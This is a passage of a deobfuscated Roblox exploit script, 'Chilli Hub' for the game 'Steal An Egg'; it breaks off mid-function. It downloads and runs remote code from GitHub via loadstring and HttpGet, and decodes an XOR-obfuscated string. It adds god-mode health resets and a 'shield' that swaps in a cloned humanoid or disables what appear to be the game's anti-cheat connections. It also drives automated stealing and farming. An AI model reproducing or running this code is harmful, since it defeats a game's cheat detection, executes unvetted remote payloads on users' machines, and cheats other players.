-- deobfuscating...
local fn, v, v2, defaultTab, Players, RunService, ReplicatedStorage, CoreGui, UserInputService, localPlayer
local networking, fn2, tbl, v3, fn3, fn4, tbl2, fn5, fn6, tbl3
local tbl4, fn7, tbl5, v4, v5, espSection, tbl6, n, tbl7, tbl8
local tbl9, tbl10, v6, sequence, tbl11

do
	local CollectionService, ProximityPromptService, v7, v8, tbl12, tbl13, tbl14, n2, n3, n4
	local tbl15, str, tbl16, tbl17, tbl18, tbl19, tbl20, tbl21, v9, v10
	local v11, createText, v12, v13, flag, tbl22, n5, tbl23, flag2, n6
	local tbl24, fn8, fn9, fn10

	do
		local v14, v15, v16, v17, v18, n7

		do
			fn = function(arg)
				local genv = typeof(getgenv) == "function" and getgenv() or _G

				if type(genv.ChilliDebugPrint) == "function" then
					pcall(genv.ChilliDebugPrint, arg)
				end
			end

			task.spawn(pcall, function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/DiscordLink"))()
			end)

			local function fn11()
				local response = nil

				local function fn12()
					if type(response) == "string" and #response > 0 then
						return response
					end
					response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli%20Library")
					return response
				end

				local function fn13()
					local chilliHubSaeCleanup = (typeof(getgenv) == "function" and getgenv() or _G).ChilliHubSaeCleanup

					if type(chilliHubSaeCleanup) == "function" then
						pcall(chilliHubSaeCleanup)
					end

					local tbl25 = { game:GetService("CoreGui") }

					if typeof(gethui) == "function" then
						local ok, result = pcall(gethui)

						if ok and typeof(result) == "Instance" then
							table.insert(tbl25, result)
						end
					end

					local tbl26 = {
						Settings = true,
						ChilliLeftCenter = true,
						ChilliLibrarySettings = true,
						ChilliLibraryLauncher = true,
					}

					local n8 = 0

					for _, v19 in ipairs(tbl25) do
						for _, child in ipairs(v19:GetChildren()) do
							if child:IsA("ScreenGui") and (child:GetAttribute("ChilliLibraryOwned") == true or tbl26[child.Name]) then
								pcall(function()
									child:Destroy()
								end)

								n8 += 1
							end
						end
					end

					if n8 > 0 then
						fn("cleared " .. n8 .. " leftover Chilli UI screens")
					end
				end

				local function fn14()
					local v19 = fn12()
					local chunk, v20 = loadstring(v19)
					assert(chunk, v20)
					local v21 = chunk()
					assert(type(v21) == "function", "Chilli Library bootstrap is invalid.")
					local v22 = table.create(45)
					local n8 = 1

					for i = 1, 90, 2 do
						v22[n8] = string.char(bit32.bxor(tonumber(string.sub("306908100841206d474f00185f26635b2101387507010810127d7d477a473b6f435a0916573165562900226c00", i, i + 1), 16), string.byte("s9K!2vQ#", (n8 - 1) % 8 + 1)))
						n8 += 1
					end

					return v21(table.concat(v22))
				end

				local chilliLibraryFailedToLoad = "unknown"

				for i = 1, 6 do
					task.wait()
					pcall(fn13)
					local ok, result = pcall(fn14)
					if ok and type(result) == "table" then
						return result
					end
					chilliLibraryFailedToLoad = tostring(result)

					if type(chilliLibraryFailedToLoad) == "string" and string.find(chilliLibraryFailedToLoad, "HttpGet", 1, true) then
						response = nil
					end

					fn("library load attempt " .. i .. " failed: " .. chilliLibraryFailedToLoad)
					task.wait(1 + i * 0.5)
				end

				error("Chilli Library failed to load: " .. chilliLibraryFailedToLoad, 0)
			end

			v = fn11()
			assert(type(v) == "table" and type(v.CreateWindow) == "function" and type(v.Finalize) == "function", "Chilli Library returned an invalid API.")

			v.ManualQuickDefaults = {
				PinnedFeatures = { "Player > Movement > Speed Boost", "Player > Movement > Boost Speed" },
				Keybinds = { ["Player > Movement > Speed Boost"] = "Q" },
				PinGroups = {},
				LeftCenterHidden = true,
			}

			v2 = v:CreateWindow({ Name = "Chilli Hub - Steal An Egg", DefaultTab = "Farm" })
			defaultTab = v2:GetDefaultTab()
			Players = game:GetService("Players")
			RunService = game:GetService("RunService")
			ReplicatedStorage = game:GetService("ReplicatedStorage")
			CoreGui = game:GetService("CoreGui")
			UserInputService = game:GetService("UserInputService")
			CollectionService = game:GetService("CollectionService")
			game:GetService("LocalizationService")
			ProximityPromptService = game:GetService("ProximityPromptService")
			localPlayer = Players.LocalPlayer
			networking = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Networking")

			fn2 = function(arg)
				local ok, result = pcall(function()
					return require(arg())
				end)

				return ok and result or nil
			end

			tbl = {
				EggState = fn2(function()
					return ReplicatedStorage.Client.EggState
				end),
				AreaEggs = fn2(function()
					return ReplicatedStorage.Shared.Types.AreaEggs
				end),
				ToolGameplayGuard = fn2(function()
					return ReplicatedStorage.Client.ToolGameplayGuard
				end),
				Assets = fn2(function()
					return ReplicatedStorage.Data.Assets
				end),
				Guards = fn2(function()
					return ReplicatedStorage.Data.Guards
				end),
				EggRecords = fn2(function()
					return ReplicatedStorage.Shared.Util.EggRecords
				end),
				Mutations = fn2(function()
					return ReplicatedStorage.Shared.Modules.Mutations
				end),
				Save = fn2(function()
					return ReplicatedStorage.Shared.Save
				end),
				FuseKernel = fn2(function()
					return ReplicatedStorage.Shared.Util.FuseKernel
				end),
				AreaEggCycle = fn2(function()
					return ReplicatedStorage.Shared.Util.AreaEggCycle
				end),
				AreaEggResetWall = fn2(function()
					return ReplicatedStorage.Client.AreaEggResetWall
				end),
				AreaEggResetCycle = fn2(function()
					return ReplicatedStorage.Data.AreaEggResetCycle
				end),
				Gears = fn2(function()
					return ReplicatedStorage.Data.Gears
				end),
				Areas = fn2(function()
					return ReplicatedStorage.Data.Areas
				end),
				LimitedEgg = fn2(function()
					return ReplicatedStorage.Data.LimitedEgg
				end),
				BrainrotEgg = fn2(function()
					return ReplicatedStorage.Data.BrainrotEgg
				end),
				MonsterEgg = fn2(function()
					return ReplicatedStorage.Data.MonsterEgg
				end),
			}

			local save = tbl.Save

			if type(save) == "table" and (type(save.Get) ~= "function" or type(save.FieldSignal) ~= "function") then
				tbl.Save = setmetatable({
					Get = type(save.Get) == "function" and save.Get or save.Peek,
					FieldSignal = type(save.FieldSignal) == "function" and save.FieldSignal or save.Watch,
				}, { __index = save })
			end

			local function fn12()
				if typeof(gethui) == "function" then
					local ok, result = pcall(gethui)
					if ok and typeof(result) == "Instance" then
						return result
					end
				end

				return CoreGui
			end

			v3 = fn12()

			do
				local v19 = Random.new()
				local str2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

				fn3 = function()
					local v20 = v19:NextInteger(12, 20)
					local v21 = table.create(v20)

					for i = 1, v20 do
						local v22 = v19:NextInteger(1, #str2)
						v21[i] = string.sub("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", v22, v22)
					end

					return table.concat(v21)
				end
			end

			do
				local tbl25 = {}

				fn4 = function(arg)
					table.insert(tbl25, arg)
				end

				tbl2 = {}

				fn5 = function(arg, arg2)
					local n8 = 1000
					local n9 = 3
					local n10 = 12

					local function fn13(arg3)
						if arg3 <= 0 then
							return 0
						end
						local n11 = 10 ^ (math.floor(math.log10(arg3)) - 2)
						return math.floor(arg3 / n11 + 0.5) * n11
					end

					local function fn14(arg3)
						local n11 = math.clamp(tonumber(arg3) or 0, 0, 1000)
						if n11 <= 0 then
							return 0
						end
						return fn13(10 ^ (n9 + (n10 - n9) * n11 / n8))
					end

					local function fn15(arg3)
						local n11 = tonumber(arg3) or 0
						if n11 <= 0 then
							return 0
						end
						return math.clamp(math.floor((math.log10(n11) - n9) / (n10 - n9) * n8 * 100 + 0.5) / 100, 0, 1000)
					end

					local function fn16(arg3)
						local str2 = string.format(arg3 >= 100 and "%.0f" or arg3 >= 10 and "%.1f" or "%.2f", arg3)

						if string.find(str2, ".", 1, true) then
							str2 = string.gsub(string.gsub(str2, "0+$", ""), "%.$", "")
						end

						return str2
					end

					local function fn17(arg3)
						local v19 = fn14(arg3)
						if v19 <= 0 then
							return "Off"
						end

						if v19 < 1000000 then
							return fn16(v19 / 1000) .. " K/s"
						end

						if v19 < 1e9 then
							return fn16(v19 / 1000000) .. " M/s"
						end
						return fn16(v19 / 1e9) .. " B/s"
					end

					local function fn18(arg3)
						local v19 = fn14(arg3)
						if v19 <= 0 then
							return "0"
						end

						if v19 < 1000000 then
							return fn16(v19 / 1000) .. "k"
						end
						return (string.gsub(string.gsub(string.format("%.3f", v19 / 1000000), "0+$", ""), "%.$", ""))
					end

					local tbl26 = { k = 1000, m = 1000000, b = 1e9, t = 1e12 }

					local function fn19(arg3)
						local v19 = string.gsub(string.lower(string.gsub(tostring(arg3 or ""), "[%s,/]", "")), "s$", "")
						if v19 == "" or v19 == "off" then
							return 0
						end
						local v20, v21 = string.match(v19, "^([%d%.]+)([kmbt]?)$")
						local num = tonumber(v20)
						if not num then
							return nil
						end
						return fn15(num * (tbl26[v21] or 1000000))
					end

					local v19 = arg:CreateSlider({
						Name = arg2.Name,
						Note = arg2.Note,
						SubOf = arg2.SubOf,
						Min = 0,
						Max = n8,
						Default = fn15(arg2.Default or 0),
						AllowDecimals = true,
						Increment = 0.01,
						ValueFormat = fn17,
						ValueParse = fn19,
						Callback = function(arg3)
							if type(arg2.OnRaw) == "function" then
								arg2.OnRaw(fn14(arg3))
							end
						end,
					})

					local value = type(v19) == "table" and rawget(v19, "Instance") or nil

					if typeof(value) == "Instance" then
						for _, descendant in ipairs(value:GetDescendants()) do
							if descendant:IsA("TextBox") then
								local connection = descendant.Focused:Connect(function()
									task.defer(function()
										if descendant:IsFocused() then
											local ok, result = pcall(v19.Get, v19)
											descendant.Text = fn18(ok and result or 0)
											descendant.CursorPosition = #descendant.Text + 1
											descendant.SelectionStart = 1
										end
									end)
								end)

								fn4(function()
									pcall(function()
										connection:Disconnect()
									end)
								end)
							end
						end
					end

					if type(arg2.Legacy) == "string" and type(arg2.SectionName) == "string" then
						table.insert(tbl2, { Handle = v19, Name = arg2.Name, Legacy = arg2.Legacy, Section = arg2.SectionName, StepOf = fn15 })
					end

					return v19
				end

				local text = "All"

				fn6 = function(arg)
					if type(arg) ~= "table" then
						return arg
					end
					local value = rawget(arg, "Instance")
					if typeof(value) ~= "Instance" then
						return arg
					end
					local flag3 = false

					local function fn13(arg2)
						if flag3 then
							return
						end

						if arg2.Text == "None" then
							flag3 = true
							arg2.Text = text
							flag3 = false
						end
					end

					local function fn14(descendant)
						if not descendant:IsA("TextLabel") or descendant.Name ~= "Value" then
							return
						end
						fn13(descendant)

						local connection = descendant:GetPropertyChangedSignal("Text"):Connect(function()
							fn13(descendant)
						end)

						fn4(function()
							pcall(function()
								connection:Disconnect()
							end)
						end)
					end

					for _, descendant in ipairs(value:GetDescendants()) do
						fn14(descendant)
					end

					local connection = value.DescendantAdded:Connect(fn14)

					fn4(function()
						pcall(function()
							connection:Disconnect()
						end)
					end)

					return arg
				end

				local genv = typeof(getgenv) == "function" and getgenv() or _G
				local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup

				if type(chilliHubSaeCleanup) == "function" then
					pcall(chilliHubSaeCleanup)
				end

				genv.ChilliHubSaeCleanup = function()
					for i = #tbl25, 1, -1 do
						pcall(tbl25[i])
					end

					table.clear(tbl25)
				end
			end

			do
				local n8 = 0
				local fn13 = nil

				fn13 = function(arg, arg2)
					local n9 = arg2 or 0

					if type(arg) == "table" then
						if n9 > 3 then
							return
						end
						local n10 = 0

						for k, v19 in pairs(arg) do
							n10 += 1

							if not (n10 > 20) then
								fn13(k, n9 + 1)
								fn13(v19, n9 + 1)
								continue
							end

							break
						end
					elseif typeof(arg) == "Instance" then
						pcall(arg.GetFullName, arg)
					else
						n8 += #tostring(arg)
					end
				end

				local tbl25 = {}

				local function fn14(arg)
					tbl25[#tbl25 + 1] = arg
				end

				local function fn15()
					for _, v19 in ipairs(tbl25) do
						pcall(function()
							v19:Disconnect()
						end)
					end

					table.clear(tbl25)
				end

				local function chilliToolKeeper()
					fn15()

					for _, v19 in ipairs({
						"RE/GearSatchel/Lost",
						"RE/GearSatchel/Gained",
						"RE/RigSync/ProbeSatchel",
						"RE/RigSync/SeedSatchel",
						"RE/RigSync/CorrectionBegan",
						"RE/RigSync/Refresh",
						"RE/ToolTrigger/Trigger",
						"RE/BatSwing/Trigger",
					}) do
						local v20 = networking:FindFirstChild(v19)

						if v20 and v20:IsA("RemoteEvent") then
							fn14(v20.OnClientEvent:Connect(function(...)
								fn13({ ... })
							end))
						end
					end

					local function fn16(arg)
						if not arg then
							return
						end

						fn14(arg.ChildRemoved:Connect(function(child)
							if child:IsA("Tool") then
								fn13({ child.Name, child.Parent })
							end
						end))

						fn14(arg.ChildAdded:Connect(function(child)
							if child:IsA("Tool") then
								fn13({ child.Name })
							end
						end))
					end

					fn16(localPlayer:FindFirstChildOfClass("Backpack"))

					fn14(localPlayer.ChildAdded:Connect(function(child)
						if child:IsA("Backpack") then
							fn16(child)
						end
					end))

					task.spawn(function()
						pcall(function()
							local v19 = tbl.Save.Get()
							fn13({ v19.GearInventory, v19.Inventory }, 2)
						end)

						if type(getgc) == "function" then
							pcall(function()
								for _, v19 in ipairs(getgc(false)) do
									if type(v19) == "function" and islclosure(v19) then
										pcall(debug.info, v19, "n")
									end
								end
							end)
						end
					end)
				end
				;(typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper = chilliToolKeeper
				task.defer(chilliToolKeeper)
				fn4(fn15)
			end

			do
				local n8 = 0.35
				local n9 = 5
				local tbl25 = {}
				local flag3 = true

				tbl3 = {
					Add = function(arg)
						local tbl26 = { Run = arg, Gap = n8, Idle = n9, Repeat = false, Hold = 0 }
						table.insert(tbl25, tbl26)
						return tbl26
					end,
					Wake = function()
						flag3 = true
					end,
					Backoff = function(arg, arg2)
						if arg then
							arg.Hold = tonumber(arg2) or 6
						end
					end,
				}

				local connection = RunService.Heartbeat:Connect(function(deltaTime)
					local v19 = flag3
					flag3 = false

					for _, v20 in ipairs(tbl25) do
						v20.Gap = v20.Gap + deltaTime
						v20.Idle = v20.Idle + deltaTime

						if v20.Hold > 0 then
							v20.Hold = v20.Hold - deltaTime
						else
							local flag4 = v20.Gap >= n8
							local repeat_

							if flag4 then
								repeat_ = v19 or v20.Repeat or v20.Idle >= n9
							else
								repeat_ = flag4
							end

							if repeat_ then
								v20.Gap = 0
								v20.Idle = 0
								local ok, result = pcall(v20.Run, v20)
								v20.Repeat = ok and result == true
							end
						end
					end
				end)

				fn4(function()
					connection:Disconnect()
				end)
			end

			v7 = defaultTab:CreateSection({ Name = "Dr Scramble Lab & Mech", Expanded = false })
			local v19
			v19 = defaultTab:CreateSection({ Name = "Auto Steal", Expanded = true })
			v14 = defaultTab:CreateSection({ Name = "Auto Place Egg", Expanded = false })
			v15 = defaultTab:CreateSection({ Name = "Auto Treadmill", Expanded = false })
			v16 = defaultTab:CreateSection({ Name = "Auto Hatch & Equip", Expanded = false })
			v17 = defaultTab:CreateSection({ Name = "Auto Sell", Expanded = false })
			v18 = defaultTab:CreateSection({ Name = "Auto Fuse Machine", Expanded = false })
			v8 = defaultTab:CreateSection({ Name = "Auto Favorite", Expanded = false })
			tbl12 = { Paused = false }

			do
				local n8 = 0.5
				local v20 = nil
				local tbl25 = nil
				local tbl26 = {}
				local flag3 = false
				local n9 = 0

				local function fn13()
					for i = #tbl26, 1, -1 do
						local v21 = tbl26[i]

						if v21 and v21.Connected then
							v21:Disconnect()
						end

						tbl26[i] = nil
					end
				end

				local function fn14()
					fn13()
					local v21 = v20
					local v22 = tbl25
					v20 = nil
					tbl25 = nil
					if not v21 or not v21.Parent or not v22 then
						return
					end

					pcall(function()
						v21.BreakJointsOnDeath = v22.BreakJointsOnDeath
						v21.RequiresNeck = v22.RequiresNeck
						v21:SetStateEnabled(Enum.HumanoidStateType.Dead, v22.DeadEnabled)
					end)
				end

				local function fn15(arg)
					if not arg or not arg.Parent then
						return false
					end

					return pcall(function()
						arg.BreakJointsOnDeath = false
						arg.RequiresNeck = false
						arg:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
					end) and arg.BreakJointsOnDeath == false and arg.RequiresNeck == false and arg:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
				end

				local function fn16(arg)
					if tbl12.Paused or arg ~= v20 or not arg or not arg.Parent or flag3 then
						return false
					end
					local maxHealth = arg.MaxHealth
					if maxHealth <= 0 then
						return false
					end

					if maxHealth == math.huge or arg.Health >= maxHealth then
						return true
					end
					flag3 = true

					local ok = pcall(function()
						arg.Health = maxHealth
					end)

					flag3 = false
					return ok and arg.Health >= maxHealth
				end

				local function fn17(arg)
					if arg == v20 and arg and arg.Parent then
						return true
					end
					fn14()
					if not arg or not arg:IsA("Humanoid") or not arg.Parent then
						return false
					end
					v20 = arg

					tbl25 = {
						BreakJointsOnDeath = arg.BreakJointsOnDeath,
						RequiresNeck = arg.RequiresNeck,
						DeadEnabled = arg:GetStateEnabled(Enum.HumanoidStateType.Dead),
					}

					if not fn15(arg) then
						fn14()
						return false
					end
					fn16(arg)

					tbl26[#tbl26 + 1] = arg.HealthChanged:Connect(function()
						fn16(arg)
					end)

					tbl26[#tbl26 + 1] = arg:GetPropertyChangedSignal("MaxHealth"):Connect(function()
						fn16(arg)
					end)

					tbl26[#tbl26 + 1] = arg.StateChanged:Connect(function(old, new)
						if new == Enum.HumanoidStateType.Dead and not tbl12.Paused then
							fn15(arg)
							fn16(arg)
						end
					end)

					n9 = os.clock()
					return true
				end

				local function fn18()
					local character = localPlayer.Character
					return character and character:FindFirstChildOfClass("Humanoid") or nil
				end

				local connection = localPlayer.CharacterAdded:Connect(function()
					task.defer(function()
						fn17(fn18())
					end)
				end)

				local connection2 = RunService.Heartbeat:Connect(function()
					local now = os.clock()
					if tbl12.Paused or now - n9 < n8 then
						return
					end
					n9 = now
					local v21 = fn18()
					if v21 ~= v20 then
						fn17(v21)
						return
					end

					if v21 then
						fn15(v21)
						fn16(v21)
					end
				end)

				task.defer(function()
					fn17(fn18())
				end)

				fn4(function()
					if connection then
						connection:Disconnect()
					end

					if connection2 then
						connection2:Disconnect()
					end

					fn14()
				end)
			end

			local tbl25 = { "bat", "katana", "axe", "staff", "club", "hammer", "sword", "blade" }

			tbl4 = {
				Steal = { Active = false, LastFinishedAt = 0, Carrying = false },
				SafeCarry = {
					Enabled = true,
					SkipUnsafe = false,
					WaitGuard = false,
					SameSpeedBigEggs = false,
					Blocked = {},
					StretchSeconds = 6,
					BeatGuard = false,
					SlowUntil = 0,
					SlowFactor = 0.3,
					LineDrop = false,
					LineGap = 12,
					LineWait = 15,
					DirectBudget = 450,
					DirectMargin = 0.3,
					CrossNow = false,
					CrossSpeed = 231,
					PickupSpeed = 154,
					HopRatio = 1.515,
					CrossRatio = 1,
					PickupRatio = 0.667,
					FarFromLine = 150,
					DropDelay = 0.19,
					LineApproach = 0.97,
					ReJump = true,
					ShakeTime = 0,
					SnapPickup = false,
					Hops = true,
					HopStep = 350,
					HopGap = 0.1,
					HopLift = 42,
					HopStop = 48,
					GetUp = true,
					ShakeInside = 1,
					CarryScale = 1,
					EasyRatio = 1.3,
					LastSkip = nil,
					Category = nil,
					PlanOk = true,
					LightMult = 0.96,
					Height = 70,
					ClimbShare = 0.5,
					Approach = "Run",
					RunSpeed = 1,
					RunWait = 0,
					RunAnimate = true,
					RunHeight = 50,
					SnapLimit = 90,
					StraightRun = true,
					RunStyle = "Velocity",
					CarryStyle = "Velocity",
					SpeedJitter = 0.08,
					Wobble = 0,
					LaneOffset = 0,
					JumpsPerMinute = 0,
					PausesPerMinute = 0,
					ReactMin = 0.2,
					ReactMax = 0.6,
					CarryReact = 0,
					SpeedRatio = 1.5,
					ExcessSeconds = 5.5,
					GuardMargin = 4,
					GuardRatio = 1.06,
					MinRatio = 1.1,
					BaseWait = 6.5,
					FreeJump = 1500,
					WaitRate = 0.9,
					RecoverTries = math.huge,
					GuessMult = 0.93,
					CarryRatio = 0.9,
					Mult = 1,
					Seen = {},
					JumpDistance = 0,
					JumpAt = 0,
					LastDelivered = 0,
					LastFailed = 0,
					Handle = nil,
				},
				Movement = {
					Owner = nil,
					PlaceWanted = false,
					StealFirst = false,
					MutationWanted = false,
					FracturedWanted = false,
				},
				AntiGuard = {
					Enabled = false,
					Busy = false,
					BusySince = 0,
					HitArms = 0,
					Handle = nil,
					Render = nil,
				},
				IsBatTool = function(arg)
					if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
						return false
					end

					if arg:GetAttribute("IsBat") == true then
						return true
					end
					local attribute = arg:GetAttribute("GearName")

					if type(attribute) == "string" then
						local gears = tbl.Gears
						local directory = type(gears) == "table" and gears.Directory or nil
						local flag3 = type(directory) == "table" and directory[attribute] or nil
						return type(flag3) == "table" and flag3.BatControllerData ~= nil
					end

					if arg:GetAttribute("ItemType") ~= nil then
						return false
					end
					local v20 = string.lower(arg.Name)

					for _, v21 in ipairs(tbl25) do
						if string.find(v20, v21, 1, true) then
							return true
						end
					end

					return false
				end,
				FindBat = function()
					local character = localPlayer.Character
					local tool = character and character:FindFirstChildWhichIsA("Tool")
					if tbl4.IsBatTool(tool) then
						return tool
					end
					local backpack = localPlayer:FindFirstChildOfClass("Backpack")

					if backpack then
						for _, child in ipairs(backpack:GetChildren()) do
							if tbl4.IsBatTool(child) then
								return child
							end
						end
					end

					if character then
						for _, child in ipairs(character:GetChildren()) do
							if tbl4.IsBatTool(child) then
								return child
							end
						end
					end

					return nil
				end,
				IsNight = function()
					local areaEggCycle = tbl.AreaEggCycle
					if type(areaEggCycle) ~= "table" or type(areaEggCycle.IsNightPhase) ~= "function" then
						return false
					end
					local ok, result = pcall(areaEggCycle.IsNightPhase, workspace:GetServerTimeNow())
					return ok and result == true
				end,
				WallSealed = function()
					local areaEggResetWall = tbl.AreaEggResetWall
					if type(areaEggResetWall) ~= "table" or type(areaEggResetWall.IsSealed) ~= "function" then
						return false
					end
					local ok, result = pcall(areaEggResetWall.IsSealed)
					return ok and result == true
				end,
				WallOpenDelay = function()
					local areaEggResetCycle = tbl.AreaEggResetCycle
					if type(areaEggResetCycle) ~= "table" then
						return 5
					end
					return (tonumber(areaEggResetCycle.WallCountdownDelayAfterDayStartsSeconds) or 2) + (tonumber(areaEggResetCycle.WallCountdownSeconds) or 3)
				end,
				ClaimMovement = function(owner)
					local movement = tbl4.Movement
					if movement.Owner == nil or movement.Owner == owner or movement.Owner == "treadmill" and owner ~= "treadmill" or movement.Owner == "scramble" and owner == "steal" then
						movement.Owner = owner
						return true
					end
					return false
				end,
				ReleaseMovement = function(arg)
					if tbl4.Movement.Owner == arg then
						tbl4.Movement.Owner = nil
					end
				end,
			}

			do
				local shieldMethods = { "Humanoid Swap", "Disable Monitor" }
				tbl4.ShieldMethods = shieldMethods
				local v20 = shieldMethods[1]
				local tbl26 = {}
				local tbl27 = {}
				local connection = nil
				local n8 = 0
				local tbl28 = { Original = nil, Clone = nil, Links = {} }
				local connection2 = nil
				local tbl29 = {}

				local function fn13()
					for _, v21 in ipairs(tbl29) do
						task.defer(function()
							pcall(v21)
						end)
					end
				end

				tbl4.OnHumanoidChanged = function(arg)
					table.insert(tbl29, arg)
					local tbl30

					tbl30 = {
						Connected = true,
						Disconnect = function()
							tbl30.Connected = false
							local v21 = table.find(tbl29, arg)

							if v21 then
								table.remove(tbl29, v21)
							end
						end,
					}

					return tbl30
				end

				local function fn14(humanoid)
					pcall(function()
						local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
						local playerModule = playerScripts and playerScripts:FindFirstChild("PlayerModule")

						if playerModule then
							local controls = require(playerModule):GetControls()

							if type(controls) == "table" then
								controls.humanoid = humanoid
							end
						end
					end)
				end

				local function fn15(arg)
					local animate = arg and arg:FindFirstChild("Animate")

					if animate and animate:IsA("LocalScript") then
						task.spawn(function()
							animate.Enabled = false
							task.wait()
							animate.Enabled = true
						end)
					end
				end

				local function fn16()
					for _, link in ipairs(tbl28.Links) do
						pcall(function()
							link:Disconnect()
						end)
					end

					table.clear(tbl28.Links)
				end

				tbl4.UndoSwap = function()
					fn16()
					local character = localPlayer.Character
					local original = tbl28.Original
					local clone = tbl28.Clone
					local v21 = tbl28
					tbl28.Original = nil
					v21.Clone = nil

					if original and clone and character and original.Parent == nil and clone.Parent == character then
						original.Parent = character
						workspace.CurrentCamera.CameraSubject = original
						fn14(original)

						pcall(function()
							clone:Destroy()
						end)

						fn15(character)
						fn13()
					end
				end

				local tbl30 = {
					[Enum.HumanoidStateType.Running] = true,
					[Enum.HumanoidStateType.RunningNoPhysics] = true,
					[Enum.HumanoidStateType.Landed] = true,
				}

				tbl4.Grounded = function(arg)
					if not arg then
						local character = localPlayer.Character
						arg = character and character:FindFirstChildOfClass("Humanoid")
					end

					if not arg or arg.Health <= 0 or arg.FloorMaterial == Enum.Material.Air then
						return false
					end
					return tbl30[arg:GetState()] == true
				end

				tbl4.ShieldPaused = false

				tbl4.WalkSpeed = function()
					local character = localPlayer.Character
					character = character and character:FindFirstChildOfClass("Humanoid")
					character = character and character.WalkSpeed or 16
					local original = tbl28.Original

					if original and original.Health > 0 then
						character = math.min(character, original.WalkSpeed)
					end

					local ok, result = pcall(function()
						local leaderstats = localPlayer:FindFirstChild("leaderstats")
						leaderstats = leaderstats and leaderstats:FindFirstChild("Speed")
						local TreadmillUtil = require(ReplicatedStorage.Shared.Util.TreadmillUtil)
						return leaderstats and TreadmillUtil.SpeedPowerToWalkSpeed(leaderstats.Value) or nil
					end)

					local n9

					if ok and tonumber(result) and result > 0 then
						n9 = math.min(character, result)
					else
						n9 = character
					end

					return n9
				end

				local function fn17()
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")
					if not humanoid or humanoid.Health <= 0 then
						return
					end

					if tbl28.Clone and tbl28.Clone.Parent == character then
						return
					end

					if not tbl4.Grounded(humanoid) then
						return
					end
					local clone = humanoid:Clone()
					humanoid.Parent = nil
					clone.Parent = character
					workspace.CurrentCamera.CameraSubject = clone
					fn14(clone)
					fn15(character)
					local v21 = tbl28
					tbl28.Original = humanoid
					v21.Clone = clone
					fn13()

					table.insert(tbl28.Links, humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
						if clone.Parent ~= nil then
							clone.WalkSpeed = humanoid.WalkSpeed
						end
					end))

					local animator = humanoid:FindFirstChildOfClass("Animator")
					local animator2 = clone:FindFirstChildOfClass("Animator")

					if animator and animator2 then
						table.insert(tbl28.Links, animator.AnimationPlayed:Connect(function(arg)
							local animation = arg.Animation
							if not animation or clone.Parent == nil then
								return
							end

							local ok, result = pcall(function()
								return animator2:LoadAnimation(animation)
							end)

							if not ok or not result then
								return
							end

							pcall(function()
								result.Priority = arg.Priority
								result.Looped = arg.Looped
								local speed = arg.Speed
								result:Play(0.05, math.max(arg.WeightTarget, 0.01), speed)
							end)

							local connection3 = nil

							connection3 = arg.Stopped:Connect(function()
								connection3:Disconnect()

								pcall(function()
									result:Stop(0.1)
								end)
							end)
						end))
					end

					table.insert(tbl28.Links, clone.Died:Connect(function()
						fn16()
						local v22 = tbl28
						tbl28.Original = nil
						v22.Clone = nil
						local character2 = localPlayer.Character

						if character2 and humanoid.Parent == nil then
							humanoid.Parent = character2
							workspace.CurrentCamera.CameraSubject = humanoid
							fn14(humanoid)
							fn13()
						end

						pcall(function()
							clone:Destroy()
						end)

						humanoid.Health = 0
					end))
				end

				local function fn18()
					if type(getconnections) ~= "function" then
						return
					end

					for _, v21 in ipairs({ RunService.Heartbeat, RunService.PreSimulation, RunService.PostSimulation }) do
						local ok, result = pcall(getconnections, v21)

						if ok and type(result) == "table" then
							for _, v22 in ipairs(result) do
								local ok2, result2 = pcall(function()
									return v22.Function
								end)

								local flag3 = ok2 and type(result2) == "function"
								local flag4 = false
								local result3 = nil

								if flag3 then
									flag4, result3 = pcall(debug.info, result2, "s")
								end

								if flag4 and string.find(tostring(result3), "UGI", 1, true) then
									local ok3, result4 = pcall(function()
										return v22.Enabled
									end)

									if not ok3 or result4 ~= false then
										if pcall(function()
											v22:Disable()
										end) then
											table.insert(tbl27, v22)
										end
									end
								end
							end
						end
					end
				end

				local function fn19()
					if connection then
						connection:Disconnect()
						connection = nil
					end

					if connection2 then
						connection2:Disconnect()
						connection2 = nil
					end

					for _, v21 in ipairs(tbl27) do
						pcall(function()
							v21:Enable()
						end)
					end

					table.clear(tbl27)
				end

				local function fn20()
					if tbl4.ShieldPaused then
						return
					end

					if v20 == shieldMethods[1] then
						fn17()
					else
						fn18()
					end
				end

				local function fn21()
					fn20()
					n8 = 0

					connection = RunService.Heartbeat:Connect(function(deltaTime)
						n8 += deltaTime
						local character = localPlayer.Character
						local flag3 = v20 == shieldMethods[1]

						if flag3 then
							flag3 = not (tbl28.Clone and character and tbl28.Clone.Parent == character)
						end

						if (flag3 and 0.25 or 3) <= n8 then
							n8 = 0
							fn20()
						end
					end)

					connection2 = localPlayer.CharacterAdded:Connect(function(character)
						fn16()
						local v21 = tbl28
						tbl28.Original = nil
						v21.Clone = nil
						if v20 ~= shieldMethods[1] then
							return
						end

						task.spawn(function()
							character:WaitForChild("Humanoid", 10)
							task.wait(1)

							if connection and localPlayer.Character == character then
								fn20()
							end
						end)
					end)
				end

				tbl4.Swapped = function()
					if v20 ~= shieldMethods[1] then
						return true
					end
					local character = localPlayer.Character
					return tbl28.Clone ~= nil and character ~= nil and tbl28.Clone.Parent == character
				end

				tbl4.Shield = function(arg, arg2)
					tbl26[arg] = arg2 == true or nil
					if next(tbl26) == nil then
						fn19()
						return
					end

					if connection then
						return
					end
					fn21()
				end

				tbl4.SetShieldMethod = function(arg)
					if not table.find(shieldMethods, arg) or arg == v20 then
						return
					end
					local flag3 = connection ~= nil
					fn19()
					v20 = arg

					if flag3 and next(tbl26) ~= nil then
						fn21()
					end
				end

				fn4(fn19)
			end

			tbl4.Shield("load", true)

			tbl4.Toggle = function(arg, arg2)
				if type(arg) ~= "table" then
					return arg2 == true
